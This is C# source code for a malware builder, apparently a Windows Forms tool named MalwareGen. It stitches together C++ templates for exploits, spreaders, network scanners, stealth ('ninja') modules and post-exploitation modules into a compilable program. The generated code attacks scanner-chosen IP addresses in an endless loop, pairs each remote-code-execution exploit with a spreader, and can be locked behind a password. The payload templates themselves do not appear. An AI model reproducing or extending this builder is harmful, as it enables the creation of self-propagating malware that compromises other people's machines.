using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Text.RegularExpressions;

namespace MalwareGen
{
    class Controller
    {
        private static String mainExploit =
            "	int  ipAddress[4];\r\n"
            + "[chooseIP](ipAddress);\r\n"
            + "	for (;;){\r\n"
            + "	initAttack(ipAddress);\r\n"
            + "    }\r\n"
            + "    WSACleanup();\r\n";
        private static String headExploit =
            "DWORD WINAPI exploit_[exploitName]( LPVOID lpParam );";
        //Start a thread with init data for thread
        private static String startThread = "\r\n"
            + "std::vector<DWORD> arr_dwThreadIdModule;\r\n"
            + "std::vector<HANDLE> arr_hThreadModule;\r\n"
            + "HANDLE hThread = NULL;\r\n"
            + "DWORD dwTID = 0;\r\n";
        //End a thread with wait for all thread in array
        private static String endThread = "\r\n"
            + "WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);\r\n"
            + "for (int i = 0; i < arr_hThreadModule.size(); i++) {\r\n"
            + "if(arr_hThreadModule[i])\r\n"
            + "CloseHandle(arr_hThreadModule[i]);\r\n"
            + "}\r\n";
        private static List<Modules> lsModules = new List<Modules>();
        public static String malPass = "";
        public static List<Modules> getlsModules()
        {
            return lsModules;
        }
        private static String[] types = { "exploit", "control", "ninja", "postexploit", "scanner", "spreader" };
        public static String moduleDir = @"Modules/";
        public static String commonDir = @"Common/";
        public static String templateDir = "";
        public static String outputDir = @"Output/";
        private static String targetDir = "";
        public static String getAllModuleName()
        {
            String ret = "";
            foreach (Modules test in lsModules)
            {
                ret += test.MName + Environment.NewLine;
            }
            return ret;
        }
        public static void clearAllModules()
        {
            lsModules.Clear();
        }
        private static void removeModulebyName(String MName)
        {
            lsModules.Remove(lsModules.Find(p => p.MName == MName));
        }
        public static void BuildTree(DirectoryInfo directoryInfo, TreeNodeCollection addInMe)
        {
            TreeNode curNode = addInMe.Add(directoryInfo.Name);

            //foreach (FileInfo file in directoryInfo.GetFiles())
            //{

            //    curNode.Nodes.Add(file.FullName, file.Name);
            //}
            foreach (DirectoryInfo subdir in directoryInfo.GetDirectories())
            {
                BuildTree(subdir, curNode.Nodes);
            }
        }
        public static bool checkMType(Modules mod)
        {
            if (types.Contains(mod.MType.ToLower()))
                return true;
            return false;
        }
        public static void addModules(Modules mod)
        {
            //validate module
            if (mod.MName == "" && !(checkMType(mod)))
            {
                MessageBox.Show("This module is invalid! Please check again");
                return;
            }
            try
            {
                //Each module just add once
                bool check = true;
                foreach (Modules a in lsModules)
                {
                    if (mod.MName == a.MName)
                        check = false;
                }
                if (check)
                {
                    //if exploit, choose Spreader for it
                    if (mod.MType.ToLower() == "exploit")
                    {
                        Modules sp = new Modules();
                        //Spreader not null
                        do
                            sp = ChooseSpreader(mod.exploitType, "for Exploit " + mod.MName);
                        while (sp == null);
                        addModules(sp);
                        mod.Spreader = sp.MName;
                    }
                    lsModules.Add(mod);
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }

        }
        private static bool validateInput(ref String ret)
        {
            if ((!Regex.IsMatch(ret, @"^[a-zA-Z0-9]|^[_-]*$")) || ret == "" || ret == null)
            {
                return false;
            }
            else
            {
                ret = ret.Trim();
                return true;
            }
        }
        private static void CopyDir(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);

            foreach (var file in Directory.GetFiles(sourceDir))
                File.Copy(file, Path.Combine(targetDir, Path.GetFileName(file)));

            foreach (var directory in Directory.GetDirectories(sourceDir))
                CopyDir(directory, Path.Combine(targetDir, Path.GetFileName(directory)));
        }
        public static void generate(String malName, String template)
        {
            string threads = "1";
            templateDir = template + "/";
            //copy template file to output folder
            targetDir = Path.Combine(outputDir, malName + "/");
            if (!Directory.Exists(targetDir) && validateInput(ref targetDir))
            {
                Directory.CreateDirectory(targetDir);
            }
            else
            {
                MessageBox.Show("Malware's name has existed or invalid, please choose another name!");
                return;
            }
            String headerFile = targetDir + malName + ".h";
            String sourceFile = targetDir + malName + ".cpp";
            File.Copy(templateDir + "template.h", headerFile, true);
            File.Copy(templateDir + "template.cpp", sourceFile, true);
            String mainHeadStr = File.ReadAllText(headerFile);
            String mainSourStr = File.ReadAllText(sourceFile);
            //Create exploit file
            if (hasRCE())
            {
                //Choose threads (targets/round)
                threads = ChooseThreads();
                //+choose main scanner
                Modules sc = ChooseScanner(false);
                addModules(sc);
                //+replace main exploit
                String text = mainExploit;
                text = text.Replace("[chooseIP]", sc.MName);
                generateExploit(ref mainSourStr, malName, sc.MName);
                mainSourStr = mainSourStr.Replace("[mainExploit]", Environment.NewLine + text);
                //+Add function name in header file
                String tmp = headExploit;
                foreach (Modules mod in lsModules)
                {
                    if (mod.MType.ToLower() == "exploit")
                    {
                        tmp = tmp.Replace("[exploitName]", mod.MName);
                        tmp += Environment.NewLine + "//[exploitName]";
                    }
                }
                mainHeadStr = mainHeadStr.Replace("[headExploit]", Environment.NewLine + tmp);
            }
            //Confirm setting
            if (!confirmGenerate(malName, template))
            {
                //if press cancel, delete targetDir
                errorHandle();
                return;
            }
            //Copy Module files and its required common lib to output folder
            foreach (Modules mod in lsModules)
            {
                //Module files
                String tmp = targetDir + mod.Path.Replace("Modules", "");
                if (!Directory.Exists(tmp))
                {
                    try
                    {
                        Directory.CreateDirectory(tmp);
                    }
                    catch
                    {
                        // handle error here
                    }
                }
                foreach (String file in mod.Files)
                {
                    File.Copy(moduleDir + file, targetDir + file, true);
                }
                //Common files
                tmp = targetDir + commonDir;
                if (!Directory.Exists(tmp))
                {
                    try
                    {
                        Directory.CreateDirectory(tmp);
                    }
                    catch
                    {
                        // handle error here
                    }
                }
                foreach (String common in mod.Commons)
                {
                    
                    String indir = commonDir + common + "/";
                    String outdir = targetDir + indir;
                    CopyDir(indir, outdir);
                }
            }
            //include independent modules (require ="")
            String modStr = "";
            foreach (Modules mod in lsModules)
            {
                //generate modules code in source, header file

                //Add option (if exist)
                if (mod.hasArgv())
                {
                    String tmp = "\n\r"
                        + "else if(strcmp(argv[0],\"" + mod.Inputs["Argv"] + "\")==0[malPass])"
                        + "\n\r"
                        + "{\n\r"
                        + mod.MName + "();"
                        + "\n\r}//[optionElseIf]";
                    mainSourStr = mainSourStr.Replace("[optionElseIf]", tmp);
                    tmp = "";
                }
                else if (mod.isIndependentModule())
                {
                    //insert start thread code
                    if (modStr == "")
                    {
                        modStr += startThread;
                    }
                    modStr += generateModule(mod.MName);
                }
                //Insert ninja modules
                else if (mod.MType.ToLower() == "ninja")
                {
                    generateNinja(ref mainSourStr, mod.MName);
                }
                //Add inputs,malName from user to module source, header file
                try
                {

                    string headfile = targetDir + mod.Path.Replace("Modules", "") + mod.MName + ".h";
                    string sourfile = targetDir + mod.Path.Replace("Modules", "") + mod.MName + ".cpp";
                    string headStr = File.ReadAllText(headfile);
                    string sourStr = File.ReadAllText(sourfile);
                    //add inputs
                    if (mod.Inputs.Count != 0)
                        foreach (KeyValuePair<String, String> item in mod.Inputs)
                        {
                            headStr = headStr.Replace("[" + item.Key + "]", item.Value);
                            sourStr = sourStr.Replace("[" + item.Key + "]", item.Value);
                        }
                    //setup malware's password for each module (if call create new process ...)
                    if (malPass != "")
                    {
                        sourStr = sourStr.Replace("[malPass]", " " + malPass);
                    }
                    else
                    {
                        sourStr = sourStr.Replace("[malPass]", "");
                    }
                    //add malName
                    headStr = headStr.Replace("[malName]", malName);
                    sourStr = sourStr.Replace("[malName]", malName);
                    //Write module file
                    File.WriteAllText(headfile, headStr);
                    File.WriteAllText(sourfile, sourStr);
                }
                catch (Exception e)
                {
                    errorHandle();
                    MessageBox.Show(e.ToString());
                }
            }
            if (modStr != "")
            {
                //insert end thread code
                modStr += endThread;
                //replace
                mainSourStr = mainSourStr.Replace("[moduleThreads]", modStr);
            }
            //Create header file
            generateHeader(ref mainHeadStr, malName, threads);
            //add malName in Main source and header file:
            mainHeadStr = mainHeadStr.Replace("[malName]", malName);
            mainSourStr = mainSourStr.Replace("[malName]", malName);
            //Setup malware's password for main file
            if (malPass != "")
            {
                mainSourStr = mainSourStr.Replace("[nArgc]", "1");
                mainSourStr = mainSourStr.Replace("[malPass]", "&&strcmp(argv[argc-1],\"" + malPass + "\")==0");
            }
            else
            {
                mainSourStr = mainSourStr.Replace("[nArgc]", "0");
                mainSourStr = mainSourStr.Replace("[malPass]", "");
            }
            //Write to file
            try
            {
                //header
                File.WriteAllText(headerFile, mainHeadStr);
                //source
                File.WriteAllText(sourceFile, mainSourStr);
                String compileStr = generateCompileStr(malName);
                frmResult frs = new frmResult(targetDir, compileStr);
                frs.Show();
            }
            catch (Exception e)
            {
                errorHandle();
                MessageBox.Show("An error has occured while writting file!" + Environment.NewLine + e.ToString());
            }
        }
        private static String generateCompileStr(String malName)
        {
            String ret = "Using Visual studio >=15 to compile " + malName;

            return ret;
        }
        private static bool hasRCE()
        {
            bool check = false;
            foreach (Modules a in lsModules)
            {
                if (a.MType.ToLower() == "exploit")
                    if (a.exploitType.ToLower() == "rce")
                        check = true;
            }
            return check;
        }
        private static void generateHeader(ref String _headStr, String malName, String threads)
        {
            String tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                //include header file
                foreach (String a in test.Files)
                    tmp += (a.Substring(a.Length - 2, 2) == ".h") ? "#include \"" + a + "\"" + Environment.NewLine : "";
            }
            _headStr = _headStr.Replace("[headerfile]", Environment.NewLine + tmp);
            tmp = "";
            //include header String
            foreach (Modules test in lsModules)
            {
                if (test.Header != null)
                    tmp += "//" + test.MName + Environment.NewLine + test.Header.Trim() + Environment.NewLine;
            }
            _headStr = _headStr.Replace("[headerString]", Environment.NewLine + tmp);
            tmp = "";
            //include threads
            _headStr = _headStr.Replace("[threads]", threads);

        }
        private static void generateExploit(ref String _sourStr, String malName, String scanner)
        {

            String mainFile = targetDir + "\\" + malName + ".cpp";
            //exFunc store exploit function for each exploit Module.
            //exThre store the code that run the exploit Module in mutithreads mode.
            String exFunc = "";
            String exThre = "";
            //String ret = "";
            //ret = File.ReadAllText(templateDir + "\\" + "template.cpp");
            bool check = false;
            foreach (Modules test in lsModules)
            {
                if (test.MType.ToLower() == "exploit")
                {
                    check = true;

                    //generate exploit function
                    try
                    {
                        exFunc += File.ReadAllText(templateDir + "\\" + "exploitFunction.cpp");
                        exThre += File.ReadAllText(templateDir + "\\" + "exploitThreads.cpp");
                    }
                    catch
                    {
                        MessageBox.Show("Can't find exploitFunction.cpp and exploitThreads.cpp in " + templateDir);
                    }
                    //generate exploit Function
                    exFunc = exFunc.Replace("[exploitName]", test.MName);
                    exFunc = exFunc.Replace("[Spreader]", test.Spreader);
                    exFunc += Environment.NewLine;
                    //generate exploit threads
                    exThre = exThre.Replace("[exploitName]", test.MName);
                    exThre = exThre.Replace("[Scanner]", scanner);
                    exThre += Environment.NewLine;
                }
            }
            if (check)
            {
                _sourStr = _sourStr.Replace("[exploitThreads]", Environment.NewLine + exThre + Environment.NewLine + "//[exploitThreads]");
                _sourStr = _sourStr.Replace("[exploit_function]", Environment.NewLine + exFunc + Environment.NewLine + "//[exploit_function]");
            }
        }
        private static void generateNinja(ref String _sourStr,String MName)
        {
            _sourStr = _sourStr.Replace("[ninjaModule]", Environment.NewLine + MName +"();\r\n"+ "//[ninjaModule]");
        }
        private static String generateModule(String MName)
        {
            String ret = Environment.NewLine;
            String tmp = File.ReadAllText(templateDir + "\\" + "moduleThreads.cpp");
            ret = tmp.Replace("[MName]", MName);
            return ret;
        }
        private static Modules ChooseSpreader(String exploitType, string info)
        {
            frmChooseSpreader testDialog = new frmChooseSpreader(exploitType, info);
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        private static Modules ChooseScanner(bool depen)
        {
            frmChooseScanner testDialog = new frmChooseScanner(depen);
            Modules ret = new Modules();

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        private static bool confirmGenerate(String malName, String template)
        {
            frmConfirm testDialog = new frmConfirm(malName, template);
            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                testDialog.Dispose();
                return true;
            }
            testDialog.Dispose();
            return false;
        }
        private static String ChooseInput(String inputName, String value, String modName)
        {
            frmInput testDialog = new frmInput(inputName, value, modName);
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        public static void addInputValue(ref Modules mod, String key, String value)
        {
            String val = ChooseInput(key, value, mod.MName);
            mod.Inputs[key] = val;
        }
        private static String ChooseThreads()
        {
            frmThreads testDialog = new frmThreads();
            String ret = "";

            if (testDialog.ShowDialog() == DialogResult.OK)
            {
                ret = testDialog.input;
                testDialog.Dispose();
            }
            testDialog.Dispose();
            return ret;
        }
        public static void errorHandle()
        {
            if (Directory.Exists(targetDir))
                try
                {
                    Directory.Delete(targetDir, true);
                }
                catch { }
        }
    }



}
